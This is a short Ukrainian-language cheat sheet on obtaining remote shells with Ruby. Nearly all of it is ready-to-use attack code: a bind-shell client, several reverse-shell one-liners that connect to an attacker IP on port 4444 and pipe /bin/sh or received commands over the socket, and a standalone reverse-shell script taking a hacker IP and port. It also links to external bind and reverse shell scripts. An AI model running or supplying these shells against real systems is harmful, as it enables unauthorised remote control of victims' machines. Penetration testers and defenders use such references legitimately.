# Віддалений Шел 

Віддалений шел означає перенаправлення чи реверсивне з'єднання з командним рядком(шелом) віддаленої атакованої машини. 

**Зверніть увагу** для комп'ютерів з Windows заміняйте "/bin/sh" на "cmd.exe"

## Підключення до прив'яханого(Bind) шелу
з Терміналу
```ruby
ruby -rsocket -e's=TCPSocket.new("VictimIP",4444);loop do;cmd=gets.chomp;s.puts cmd;s.close if cmd=="exit";puts s.recv(1000000);end'
```
де `192.168.0.15` - IP адреса атакованої машини.

## Зворотній, реверсивний шел
Атакуючий слухає на порту 4444 `nc -lvp 4444`. Тепер на атакованій машині виконайте наступне:
```ruby
ruby -rsocket -e's=TCPSocket.open("192.168.0.13",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
```

Якщо ви не бажаєте покладатися на `/bin/sh`:

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.0.13","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

Якщо ви не бажаєте покладатися на `cmd.exe`
```ruby
ruby -rsocket -e 'c=TCPSocket.new("192.168.0.13","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

де `192.168.0.13` - IP адреса атакуючої машини.

І якщо вам потрібен більш  гнучкий скрипт:

```ruby
#!/usr/bin/env ruby
# KING SABRI | @KINGSABRI
require 'socket'
if ARGV[0].nil? || ARGV[1].nil?
    puts "ruby #{__FILE__}.rb [HACKER_IP HACKER_PORT]\n\n"
    exit
end
ip, port = ARGV
s = TCPSocket.open(ip,port).to_i
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
```

## Прив'язаний(bind) та зворотній(reverse) шели 
Ось чудова реалізація скрипту для прив'язки[bind][1] та створення реверсивного[reverse][2] шелу написаниго [Hood3dRob1n][3]. Bind шел потрубеє аутентифікації в той час як реверсійний - ні.



<br><br><br>
---
[1]: https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells/blob/master/bind.rb
[2]: https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells/blob/master/rubyrev.rb
[3]: https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells